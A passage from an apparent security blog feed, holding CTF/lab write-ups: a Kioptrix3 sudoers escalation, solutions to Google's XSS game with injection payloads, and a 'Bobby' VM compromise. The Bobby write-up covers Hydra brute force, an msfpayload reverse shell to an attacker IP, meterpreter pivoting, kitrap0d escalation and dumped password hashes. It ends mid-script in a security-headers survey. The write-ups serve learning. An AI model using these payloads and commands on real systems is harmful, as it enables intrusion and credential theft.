</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="err">$</span> <span class="nx">sudo</span> <span class="o">-</span><span class="nx">l</span>
</span><span class='line'><span class="nx">User</span> <span class="nx">loneferret</span> <span class="nx">may</span> <span class="nx">run</span> <span class="nx">the</span> <span class="nx">following</span> <span class="nx">commands</span> <span class="nx">on</span> <span class="k">this</span> <span class="nx">host</span><span class="o">:</span>
</span><span class='line'>    <span class="p">(</span><span class="nx">root</span><span class="p">)</span> <span class="nx">NOPASSWD</span><span class="o">:</span> <span class="o">!/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">bin</span><span class="o">/</span><span class="nx">su</span>
</span><span class='line'>    <span class="p">(</span><span class="nx">root</span><span class="p">)</span> <span class="nx">NOPASSWD</span><span class="o">:</span> <span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">local</span><span class="o">/</span><span class="nx">bin</span><span class="o">/</span><span class="nx">ht</span>
</span></code></pre></td></tr></table></div></figure>


<p>Thanks to this, I only had to edit the <code>/etc/sudoers</code> file and update the entry:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="nx">loneferret</span> <span class="nx">ALL</span><span class="o">=</span><span class="nx">NOPASSWD</span><span class="o">:</span> <span class="o">!/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">bin</span><span class="o">/</span><span class="nx">su</span><span class="p">,</span> <span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">local</span><span class="o">/</span><span class="nx">bin</span><span class="o">/</span><span class="nx">ht</span><span class="p">,</span> <span class="o">/</span><span class="nx">bin</span><span class="o">/</span><span class="nx">bash</span>
</span></code></pre></td></tr></table></div></figure>


<p>Back to the terminal:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="nx">loneferret</span><span class="o">@</span><span class="nx">Kioptrix3</span><span class="o">:~</span><span class="err">$</span> <span class="nx">sudo</span> <span class="nx">bash</span>
</span><span class='line'><span class="nx">root</span><span class="o">@</span><span class="nx">Kioptrix3</span><span class="o">:~</span><span class="c1">#</span>
</span></code></pre></td></tr></table></div></figure>


<p></p>

<p>and Voilà, I was able to access the file <code>/root/Congrats.txt</code>.</p>

<p>Nice VM it was a fun trick with <code>ht</code> command.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Diving into XSS Google's Game]]></title>
    <link href="http://paulsec.github.io/blog/2014/06/02/diving-into-xss-googles-game/"/>
    <updated>2014-06-02T19:34:12+02:00</updated>
    <id>http://paulsec.github.io/blog/2014/06/02/diving-into-xss-googles-game</id>
    <content type="html"><![CDATA[<p>Hi there, this post deals with the game released by Google few days ago about XSS vulnerabilities that you can find <a href="https://xss-game.appspot.com/">here</a>.</p>

<p>I&rsquo;ll enumerate some of the solution I found on the Internet which were (in my opnion) interesting/fun.
This post contains the solutions for all levels. <strong>Big spoil.</strong></p>

<h2>Level 1: Hello, world of XSS</h2>

<p>Well, this one was obvious:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span><span class="o">&lt;</span><span class="err">/script&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<h2>Level 2: Persistence is key</h2>

<p>For this one, you had different options:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">&quot;test&quot;</span> <span class="na">onclick=</span><span class="s">&quot;javascript:alert(1);&quot;</span><span class="nt">&gt;</span>test<span class="nt">&lt;/a&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p><em>Creating a link (will need an interaction with the user)</em></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">&quot;test.png&quot;</span> <span class="na">onerror=</span><span class="s">&quot;javascript:alert(1);&quot;</span> <span class="nt">/&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p><em>Loading an invalid image (using onerror) &ndash; no interaction</em></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">&quot;https://xss-game.appspot.com/static/level2_icon.png&quot;</span> <span class="na">onload=</span><span class="s">&quot;alert(1);&quot;</span> <span class="nt">/&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p><em>Loading a valid image (using onload) &ndash; no interaction</em></p>

<h2>Level 3: That sinking feeling&hellip;</h2>

<p>The image loaded on the page uses the <code>window.location.hash</code> javascript property.</p>

<p>We can abuse it this way:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="mi">1</span><span class="p">.</span><span class="nx">jpg</span><span class="s1">&#39; onload=&#39;</span><span class="nx">javascript</span><span class="o">:</span><span class="nx">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span><span class="err">&#39;</span>
</span></code></pre></td></tr></table></div></figure>


<p><em>Loading a valid image (using onload) &ndash; no interaction</em></p>

<p>And also:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="err">&#39;</span> <span class="nx">onerror</span><span class="o">=</span><span class="s2">&quot;alert(1)&quot;</span><span class="o">&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p><em>Loading an invalid image (using onerror) &ndash; no interaction</em></p>

<p>It was also possible to use the <code>script</code> tag like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="err">&#39;</span><span class="o">&gt;&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span><span class="o">&lt;</span><span class="err">/script&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<h2>Level 4: Context matters</h2>

<p>To do this one there were different approaches:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="mi">1</span><span class="s1">&#39;)%3Balert(&#39;</span><span class="mi">1</span>
</span></code></pre></td></tr></table></div></figure>


<p>The semicolon character had to be encoded because otherwise it was escaped.</p>

<p>It was possible to escape <code>'</code> (single-quote character) too.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="mi">1</span><span class="o">%</span><span class="mi">27</span><span class="p">)</span><span class="o">%</span><span class="mi">3</span><span class="nx">balert</span><span class="p">(</span><span class="o">%</span><span class="mi">271</span>
</span></code></pre></td></tr></table></div></figure>


<p>It was also possible to use <code>||</code> logical operator.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="mi">1</span><span class="s1">&#39;) || alert(&#39;</span><span class="mi">1</span>
</span></code></pre></td></tr></table></div></figure>


<p>It was also possible to do it without any encoding/operator this way:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="mi">1</span><span class="err">&#39;</span><span class="p">);</span><span class="nx">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span><span class="c1">//</span>
</span></code></pre></td></tr></table></div></figure>


<h2>Level 5: Breaking protocol</h2>

<p>For this one, characters such as <code>"</code> (double-quote) was escaped.</p>

<p>We could just use:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="nx">javascript</span><span class="o">:</span><span class="nx">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>Then, after clicking on the link, we popped up the alert box.</p>

<h2>Level 6: Follow the rabbit</h2>

<p>For the last level, it was possible to use <code>data:text/javascript</code> this way:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="nx">data</span><span class="o">:</span><span class="nx">text</span><span class="o">/</span><span class="nx">javascript</span><span class="p">,</span><span class="nx">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>The regex was also case sensitive, so.. instead of &ldquo;http&rdquo;, we could write it &ldquo;HTTP&rdquo;.
Then, we were able to load remote scripts this way:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="nx">HTTP</span><span class="o">:</span><span class="c1">//127.0.0.1:8000</span>
</span></code></pre></td></tr></table></div></figure>


<p>or adding a whitespace at the beginning:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="nx">http</span><span class="o">:</span><span class="c1">//127.0.0.1:8000</span>
</span></code></pre></td></tr></table></div></figure>


<p>the index page only had to contain some javascript like: <code>alert(1);</code>.</p>

<p>I saw on the internet that some people didn&rsquo;t manage to load some HTTP scripts because they were using the HTTPS version.
In this case, you can create a simple HTTPS Server (using Node.js for example).</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="kd">var</span> <span class="nx">https</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;https&#39;</span><span class="p">);</span>
</span><span class='line'><span class="kd">var</span> <span class="nx">fs</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;fs&#39;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="kd">var</span> <span class="nx">hskey</span> <span class="o">=</span> <span class="nx">fs</span><span class="p">.</span><span class="nx">readFileSync</span><span class="p">(</span><span class="s1">&#39;server.key&#39;</span><span class="p">);</span>
</span><span class='line'><span class="kd">var</span> <span class="nx">hscert</span> <span class="o">=</span> <span class="nx">fs</span><span class="p">.</span><span class="nx">readFileSync</span><span class="p">(</span><span class="s1">&#39;server.crt&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="kd">var</span> <span class="nx">options</span> <span class="o">=</span> <span class="p">{</span>
</span><span class='line'>    <span class="nx">key</span><span class="o">:</span> <span class="nx">hskey</span><span class="p">,</span>
</span><span class='line'>    <span class="nx">cert</span><span class="o">:</span> <span class="nx">hscert</span>
</span><span class='line'><span class="p">};</span>
</span><span class='line'>
</span><span class='line'><span class="nx">https</span><span class="p">.</span><span class="nx">createServer</span><span class="p">(</span><span class="nx">options</span><span class="p">,</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="nx">res</span><span class="p">.</span><span class="nx">writeHead</span><span class="p">(</span><span class="mi">200</span><span class="p">);</span>
</span><span class='line'>    <span class="nx">res</span><span class="p">.</span><span class="nx">end</span><span class="p">(</span><span class="s2">&quot;alert(1);&quot;</span><span class="p">);</span>
</span><span class='line'><span class="p">}).</span><span class="nx">listen</span><span class="p">(</span><span class="mi">8000</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p><em>Simple HTTPS Server using Node.js</em></p>

<p>In both cases, you could bypass the filter using:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="c1">//website.com/evilscript.js</span>
</span></code></pre></td></tr></table></div></figure>


<p><strong>//</strong> is another way to say <code>https</code> or <code>http</code> depending on the protocol you were using.</p>

<p>For example, if we have our HTTPS Server running, we can inject this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="c1">//127.0.0.1:8000</span>
</span></code></pre></td></tr></table></div></figure>


<p>Done.</p>

<p>Hope you learnt at least one trick.
This game was really fun. Waiting for the next one.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Bobby: Write-up]]></title>
    <link href="http://paulsec.github.io/blog/2014/05/15/bobby-write-up/"/>
    <updated>2014-05-15T20:51:48+02:00</updated>
    <id>http://paulsec.github.io/blog/2014/05/15/bobby-write-up</id>
    <content type="html"><![CDATA[<p>Hi there,</p>

<p>Quick blog post on the VM &ldquo;Bobby&rdquo; which is once of the nicest VM I did so far.</p>

<h4>Discovery</h4>

<p>The first step is always the same: discovering the machine on the network.
To do so:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ nmap -sV 192.168.1.1/24</span></code></pre></td></tr></table></div></figure>


<p>I managed to retrieve the IP address: <code>192.168.1.11</code>.</p>

<p>Let&rsquo;s start to fingerprint the different services to exploit it.</p>

<h4>Fingerprinting</h4>

<p>Then, I used Nmap to retrieve the services running:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ nmap -sV 192.168.1.11
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.46 ( http://nmap.org ) at 2014-05-15 20:54 CEST
</span><span class='line'>Nmap scan report for 192.168.1.11
</span><span class='line'>Host is up (0.00037s latency).
</span><span class='line'>Not shown: 997 filtered ports
</span><span class='line'>PORT    STATE  SERVICE VERSION
</span><span class='line'>21/tcp  open   ftp     Microsoft ftpd
</span><span class='line'>80/tcp  open   http    Microsoft IIS httpd 5.1
</span><span class='line'>443/tcp closed https
</span><span class='line'>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
</span><span class='line'>
</span><span class='line'>Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 12.35 seconds</span></code></pre></td></tr></table></div></figure>


<p>Using Nikto as well:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ ./nikto.pl -h http://192.168.1.11
</span><span class='line'>- Nikto v2.1.5
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ Target IP:          192.168.1.11
</span><span class='line'>+ Target Hostname:    192.168.1.11
</span><span class='line'>+ Target Port:        80
</span><span class='line'>+ Start Time:         2014-05-15 20:56:29 (GMT2)
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ Server: Microsoft-IIS/5.1
</span><span class='line'>+ Server leaks inodes via ETags, header found with file /, fields: 0x20b456b8599ce1:a02 
</span><span class='line'>+ The anti-clickjacking X-Frame-Options header is not present.
</span><span class='line'>+ No CGI Directories found (use '-C all' to force check all possible dirs)
</span><span class='line'>+ Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, PUT, DELETE 
</span><span class='line'>+ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
</span><span class='line'>+ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
</span><span class='line'>+ Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST 
</span><span class='line'>+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
</span><span class='line'>+ OSVDB-877: HTTP TRACK method is active, suggesting the host is vulnerable to XST
</span><span class='line'>+ OSVDB-3092: /localstart.asp: This may be interesting...
</span><span class='line'>+ 6544 items checked: 0 error(s) and 9 item(s) reported on remote host
</span><span class='line'>+ End Time:           2014-05-15 20:56:50 (GMT2) (21 seconds)
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ 1 host(s) tested</span></code></pre></td></tr></table></div></figure>


<p>The page <code>localstart.asp</code> was asking some credentials but unfortunately I didn&rsquo;t have them.</p>

<p>I also used DirBuster but I couldn&rsquo;t find relevant files/directories.</p>

<p>I decided to target the FTP Server.
I checked if there was an anonymous access on the FTP but there was none. Unfortunately.</p>

<p>Based on the Web Application I decided to create some custom Wordlist because I didn&rsquo;t have any clue on what kind of password it could have been .</p>

<p>I used the awesome tool <a href="http://www.remote-exploit.org/articles/misc_research__amp_code/index.html"><strong>Wyd</strong></a> that extracts single words/strings in some files.</p>

<p>To do so:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>wget http://192.168.1.11 -O bobby.html</span></code></pre></td></tr></table></div></figure>


<p>And then :</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>./wyd.pl -o bobby.txt bobby.html</span></code></pre></td></tr></table></div></figure>


<p>The output is:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>TheXero-01
</span><span class='line'>Bobby's
</span><span class='line'>blog
</span><span class='line'>Welcome
</span><span class='line'>to
</span><span class='line'>my
</span><span class='line'>personal
</span><span class='line'>blogging
</span><span class='line'>website
</span><span class='line'>but
</span><span class='line'>here
</span><span class='line'>are
</span><span class='line'>a
</span><span class='line'>few
</span><span class='line'>things
</span><span class='line'>about
</span><span class='line'>me
</span><span class='line'>Favourite
</span><span class='line'>film
</span><span class='line'>Matrix
</span><span class='line'>reloaded
</span><span class='line'>music
</span><span class='line'>artist
</span><span class='line'>Daft
</span><span class='line'>Punk
</span><span class='line'>os
</span><span class='line'>Windows
</span><span class='line'>31
</span><span class='line'>bobby</span></code></pre></td></tr></table></div></figure>


<p>Moreover, I didn&rsquo;t have any clue on the Username but thanks to the information we retrieved, I thought the username was something like:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Bobby
</span><span class='line'>BOBBY
</span><span class='line'>BOB
</span><span class='line'>BoB
</span><span class='line'>Bob
</span><span class='line'>bob
</span><span class='line'>BOb
</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>


<p>After cracking it using Hydra, I was able to log in using those credentials: Bob/Matrix. Yay!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ftp&gt; o
</span><span class='line'>(to) 192.168.1.11
</span><span class='line'>Connected to 192.168.1.11.
</span><span class='line'>220 Microsoft FTP Service
</span><span class='line'>Name (192.168.1.11:paul): Bob
</span><span class='line'>331 Password required for Bob.
</span><span class='line'>Password:
</span><span class='line'>230 User Bob logged in.
</span><span class='line'>Remote system type is Windows_NT.
</span><span class='line'>ftp&gt; </span></code></pre></td></tr></table></div></figure>


<p>Thanks to this access, I found a file called: <code>hint.html</code>:</p>

<p>*#1 This very common Windows file is not downloaded or interpretered but rather executed server side *</p>

<h4>Exploitation</h4>

<p>The scenario I have now is to create a reverse meterpreter backdoor, upload it, and execute it by getting to the page</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>http://192.168.1.11/backdoor.exe </span></code></pre></td></tr></table></div></figure>


<p>I created the payload using <em>msfpayload</em>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msfpayload windows/shell_reverse_tcp LHOST=192.168.1.68 LPORT=4444 X &gt; /tmp/backdoor.exe</span></code></pre></td></tr></table></div></figure>


<p>Then, I uploaded the backdoor, had a listener on port 4444 and got a meterpreter session. Good!</p>

<p>However, the meterpreter session stopped few mins later because of some timeout with the Web application&#8221;.
I decided to :</p>

<ul>
<li>Re-execute the backdoor by accessing the file through the Web server</li>
<li>Then, after getting the meterpreter session, execute it again: <code>execute -f backdoor.exe</code></li>
<li>Go in backgroud, and restart a handler.</li>
</ul>


<p>You need to do it fast enough to catch the connection. Otherwise, you&rsquo;ll wait, and wait..</p>

<p>Then, I got this second meterpreter session and I was sure this would not terminate because of some timeout.
It was time to get SYSTEM privileges!</p>

<h4>Getting SYSTEM</h4>

<p>The first attempt was to use <code>getsystem</code> but unfortunately, I didn&rsquo;t have enough privileges.
I couldn&rsquo;t migrate to another process.</p>

<p>So, I decided to have a lot at all the processes, and services running on localhost which were not accessible from the outside.
That&rsquo;s where I found the Terminal Server.</p>

<p>I decided to add some route:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>route add 127.0.0.1 255.255.255.0 2</span></code></pre></td></tr></table></div></figure>


<p>I added a route that allowed me target the remote machine with the IP 127.0.0.1.
The traffic was tunneled through the meterpreter&rsquo;s session. Nice trick, like it.</p>

<p>Then, I portforwarded the Terminal Server port: 3389.</p>

<p>I did it like this: <code>portfwd add -l 3389 -p 3389 -r 127.0.0.1</code></p>

<p>That allowed me to target the local port 3389 and will forward the whole traffic to the remote port 3389.
Another nice trick I like with Meterpreter.</p>

<p>Thanks to this, I was able to use <strong>rdesktop</strong> and log in with <strong>Bob</strong> account (using password: Matrix).
Then, I executed again the backdoor to get a proper user running the process.</p>

<p>I managed to retrieve another meterpreter&rsquo;s session. I tried to use <code>getsystem</code> command again but no luck.
However, I remember about an exploit called <a href="http://www.exploit-db.com/exploits/11199/"><strong>Kitrap0d</strong></a>.</p>

<p>I checked if it was still in Metasploit (I remember it was another method in getsystem) and I was able to use it.
Linked it to my Meterpreter&rsquo;s session and &ldquo;Voilà!&rdquo;, I got SYSTEM privileges. :&ndash;)</p>

<p>The metasploit module is: <a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/ms10_015_kitrap0d.rb"><em>exploit/windows/local/ms10_015_kitrap0d</em></a>.</p>

<p>Then, I was able to dump hashes from the system:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Administrator:500:921988ba001dc8e1e1c7c53891cb0efa:e1270db1dd8bf1e32725729695aa1feb:::
</span><span class='line'>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span><span class='line'>HelpAssistant:1000:887f24b0020b273cb90fe7c65f15ca55:c9ee87d435cfd6b9b824e7476e87ee23:::
</span><span class='line'>SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:904376a878474e83e38973eb591a30bf:::
</span><span class='line'>bob:1003:66e5d5ae82299cb6aad3b435b51404ee:42865c72994c34e54d4c5d659fc15b10:::
</span><span class='line'>IUSR_BOBBY:1004:cd15c852291896b9bcb0b504caf52a34:290a598ad6db348292cd06eeda96a626:::
</span><span class='line'>IWAM_BOBBY:1005:2b726cbf313f69b4617d49f3866beaad:1dddcc00ab4bcbe9e21b767f8a9a4d9e:::</span></code></pre></td></tr></table></div></figure>


<p>And then, I cracked the passwords (for fun) using John The Ripper and Administrator&rsquo;s password was: <em>P@SSW0RD12345</em>.</p>

<p>I hope you liked the write-up which contains (in my opinion) funny tricks by adding some route, doing port forwarding, etc.
Cheers and see you soon!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[HTTP Security Headers on top 10k Alexa websites]]></title>
    <link href="http://paulsec.github.io/blog/2014/05/13/http-security-headers-on-top-10k-alexa-websites/"/>
    <updated>2014-05-13T18:32:58+02:00</updated>
    <id>http://paulsec.github.io/blog/2014/05/13/http-security-headers-on-top-10k-alexa-websites</id>
    <content type="html"><![CDATA[<script type="text/javascript" src="https://www.google.com/jsapi"></script>


<script type="text/javascript">
      google.load("visualization", "1", {packages:["corechart"]});
      google.setOnLoadCallback(drawChart);
      function drawChart() {
        // all headers
        var data = google.visualization.arrayToDataTable([
          ['Header', 'Value'],
          ['X-Frame-Options', 799],
          ['X-XSS-Protection', 374],
          ['X-Content-Type-Options', 202],
          ['Strict-Transport-Security', 97],
          ['Content-Security-Policy', 16],
          ['Content-Security-Policy-Report-Only', 2]
        ]);

        var options = {
          title: 'Presence of Security Headers'
        };

        var chart = new google.visualization.ColumnChart(document.getElementById('hosts-up'));
        chart.draw(data, options);

        // X-Frame-Options
        var data = google.visualization.arrayToDataTable([
          ['Value', 'Occurence'],  
          ['SAMEORIGIN', 665],
          ['DENY', 127],
          ['ALLOW-FROM', 5],
          ['ALLOWALL', 1],
          ['GOFORIT', 1]
        ]);

        var options = {
          title: 'X-Frame-Options Statistics'
        };

        var chart = new google.visualization.PieChart(document.getElementById('x-frame-options-stats'));
        chart.draw(data, options);

        // X-XSS-Protection
        var data = google.visualization.arrayToDataTable([
          ['Value', 'Occurence'],  
          ['1; mode=block', 340],
          ['0', 24],
          ['1', 10]
        ]);

        var options = {
          title: 'X-XSS-Protection Statistics'
        };

        var chart = new google.visualization.PieChart(document.getElementById('x-xss-protection-stats'));
        chart.draw(data, options);

        // Strict-Transport-Security
